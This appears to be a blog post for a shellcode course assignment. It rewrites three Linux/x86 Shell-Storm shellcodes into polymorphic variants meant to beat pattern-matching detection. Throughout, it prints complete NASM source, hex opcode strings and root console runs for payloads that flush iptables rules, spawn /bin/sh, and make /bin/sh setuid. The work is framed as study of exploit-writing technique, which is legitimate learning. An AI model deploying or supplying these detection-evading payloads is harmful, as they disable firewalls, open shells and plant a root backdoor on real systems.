---
layout: single 
classes: wide
title:  "Polymorphic Shellcode"
date:   2020-03-23 06:54:06 +0800
categories: jekyll update
---

This assigment shows 3 [polymorphic](https://en.wikipedia.org/wiki/Polymorphic_code) shellcodes from [Shell-storm.org](http://shell-storm.org/).

## Requirements

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat the pattern matching
- The polymorphic versions cannot be larger 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## 1. Linux/x86 - iptables --flush

- Original shellcode size : 43 bytes
- Polymorphic shellcode size: 61 bytes (42% increase)
- Source code: [Linux/x86 - iptables --flush](http://shell-storm.org/shellcode/files/shellcode-825.php)

### Original Shellcode

{% highlight nasm linenos %}
global _start

_start:
    xor eax,eax
    push eax
    push word 0x462d
    mov esi, esp
    push eax
    push 0x73656c62
    push 0x61747069
    push 0x2f6e6962
    push 0x732f2f2f
    mov ebx,esp
    push eax
    push esi
    push ebx
    mov ecx,esp
    mov edx, eax
    mov al,0xb
    int 0x80
{% endhighlight %}

### Polymorphic Shellcode

I've modified the shellcode by adding `ror` (right rotate) instruction.

{% highlight nasm linenos %}
global _start

_start:
    xor eax,eax
    push eax
    push word 0x8c5a  ; -F : ror 1
    ror word [esp], 1
    mov esi,esp

    push eax
    push 0xe6cad8c4   ; selb : ror 1
    ror dword [esp], 1
    push 0xc2e8e0d2   ; atpi : ror 1
    ror dword [esp], 1
    push 0x5e5edcd2   ; /nib : ror 1
    ror dword [esp], 1
    push 0xc4e65e5e   ; bs// : ror 1
    ror dword [esp], 1
    mov ebx,esp
    
    push eax          ; null
    push esi          ; F-
    push ebx          ; selbatpi//nibs//
    mov ecx,esp
    
    mov  edx,eax
    mov  al,0xe
    sub  al,0x3
    int  0x80
{% endhighlight %}

### POC

To compile and run the shellcode i've created the helper script `Makefile` to automate the repetitive tasks, please refer to ["Shell Bind TCP Shellcode"](http://localhost:8080/jekyll/update/2020/02/01/1-Shell-Bind-Tcp.html#helper-script) page.

- Compile the assembly code: `make target=filename`
- Run the shellcode C wrapper: `make target=filename run-shellcode`

#### Original Shellcode

{% highlight console linenos %}
root@ubuntu:/home/kecebong/slae32/assigment/poly# make target=iptables hex
[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     43       0       0      43      2b iptables

[*] Shellcode:
"\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74
\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89
\xc2\xb0\x0b\xcd\x80"
{% endhighlight %}

#### Polymorphic Shellcode

{% highlight console linenos %}
root@ubuntu:/home/kecebong/slae32/assigment/poly# iptables -nvL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
   12   720 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 6 packets, 1696 bytes)
 pkts bytes target     prot opt in     out     source               destination  

root@ubuntu:/home/kecebong/slae32/assigment/poly# make target=iptables-poly run-shellcode
[*] Running shellcode...
./shellcode
Shellcode Length:  43

root@ubuntu:/home/kecebong/slae32/assigment/poly# iptables -nvL
Chain INPUT (policy ACCEPT 7 packets, 400 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 4 packets, 560 bytes)
 pkts bytes target     prot opt in     out     source               destination  
{% endhighlight %}

#### Demo
![image](/assets/img/assigment6_1.gif)

## 2. Linux/x86 - Tiny Execve sh

- Original shellcode size : 21 bytes
- Polymorphic shellcode size: 20 bytes (4% decrease)
- Source code: [Linux/x86 - Tiny Execve sh](http://shell-storm.org/shellcode/files/shellcode-841.php)

### Original Shellcode

To convert the shellcode to assembly:
```
echo -e "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" | \
ndisasm -u - | cut -f4- -d" " | column -t
```
{% highlight nasm linenos %}
global _start

_start:
  xor   ecx,ecx
  mul   ecx
  mov   al,0xb
  push  ecx
  push  dword 0x68732f2f
  push  dword 0x6e69622f
  mov   ebx,esp
  int   0x80
{% endhighlight %}

#### Polymorphic Shellcode

{% highlight console linenos %}
global _start

_start:
	jmp short shell_str ; get address of shell

sys_call:
	pop ebx             ; ebx = /bin/sh
	push byte 0xb       ; execve = 11 ~ 0xb
  pop eax
 	int 0x80

shell_str:
	call sys_call
	shell: db '/bin/sh'
{% endhighlight %}

### POC

- Compile the assembly code: `make target=filename`
- Run the shellcode C wrapper: `make target=filename run-shellcode`

#### Original Shellcode

{% highlight console linenos %}
kecebong@ubuntu:~/slae32/assigment/poly$ make target=tiny
[*] Assembling with nasm...
nasm -f elf32 -o tiny.o tiny.nasm

[*] Linking object...
ld -m elf_i386 -o tiny tiny.o

[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     21       0       0      21      15 tiny

[*] Shellcode:
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
{% endhighlight %}

#### Polymorphic Shellcode

{% highlight console linenos %}
kecebong@ubuntu:~/slae32/assigment/poly$ echo $$
1972
kecebong@ubuntu:~/slae32/assigment/poly$ make target=tiny-poly 
[*] Assembling with nasm...
nasm -f elf32 -o tiny-poly.o tiny-poly.nasm

[*] Linking object...
ld -m elf_i386 -o tiny-poly tiny-poly.o

[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     20       0       0      20      14 tiny-poly

[*] Shellcode:
"\xeb\x06\x5b\x6a\x0b\x58\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

kecebong@ubuntu:~/slae32/assigment/poly$ make target=tiny-poly run-shellcode
[*] Running shellcode...
./shellcode
Shellcode Length:  20
kecebong@ubuntu:/home/kecebong/slae32/assigment$ echo $$
9988
kecebong@ubuntu:/home/kecebong/slae32/assigment$ exit
exit
kecebong@ubuntu:~/slae32/assigment/poly$ echo $$
1972
{% endhighlight %}

#### Demo
![image](/assets/img/assigment6_2.gif)

## 3. Linux/x86 - chmod(//bin/sh ,04775); set sh +s

- Original shellcode size : 31 bytes
- Polymorphic shellcode size: 33 bytes (6% increase)
- Source code: [Linux/x86 - chmod(//bin/sh ,04775); set sh +s](http://shell-storm.org/shellcode/files/shellcode-550.php)

### Original Shellcode

{% highlight nasm linenos %}
global _start

_start:
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    push ebx
    push dword 0x68732f6e  ; hs/n
    push dword 0x69622f2f  ; ib//
    mov ebx,esp
    mov cx,0x9fd
    mov al,0xf
    int 0x80
    mov al,0x1
    int 0x80
{% endhighlight %}

### Polymorphic Shellcode

{% highlight nasm linenos %}
global _start

_start:
    xor eax,eax
    push ecx
    push dword 0x343997b7
    rol dword [esp], 1
    push dword 0xd2c45e5e ; rol, 1
    ror dword [esp], 1
    mov ebx,esp

    mov cx,0x9fd    ; 04775
    mov al,0xf      ; sys_chmod
    int 0x80

    mov al,0x1
    int 0x80
{% endhighlight %}

### POC

- Compile the assembly code: `make target=filename`
- Run the shellcode C wrapper: `make target=filename run-shellcode`

#### Original Shellcode

{% highlight console linenos %}
root@ubuntu:/home/kecebong/slae32/assigment/poly# make target=chmod hex

[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     31       0       0      31      1f chmod

[*] Shellcode:
"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"
{% endhighlight %}

#### Polymorphic Shellcode

{% highlight console linenos %}
root@ubuntu:/home/kecebong/slae32/assigment/poly# ls -alh /bin/sh
-rwxr-xr-x 1 root root 900K Mar 31 22:20 /bin/sh

root@ubuntu:/home/kecebong/slae32/assigment/poly# make target=chmod-poly 
[*] Assembling with nasm...
nasm -f elf32 -o chmod-poly.o chmod-poly.nasm

[*] Linking object...
ld -m elf_i386 -o chmod-poly chmod-poly.o

[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     33       0       0      33      21 chmod-poly

[*] Shellcode:
"\x31\xc0\x51\x68\xb7\x97\x39\x34\xd1\x04\x24\x68\x5e\x5e\xc4\xd2\xd1\x0c\x24
\x89\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

root@ubuntu:/home/kecebong/slae32/assigment/poly# make target=chmod-poly run-shellcode
[*] Running shellcode...
./shellcode
Shellcode Length:  33

root@ubuntu:/home/kecebong/slae32/assigment/poly# ls -alh /bin/sh /bin/bash
-rwsrwxr-x 1 root root 900K Mar 31 22:20 /bin/sh
{% endhighlight %}

#### Demo
![image](/assets/img/assigment6_3.gif)

{% include_relative slae32.html %}



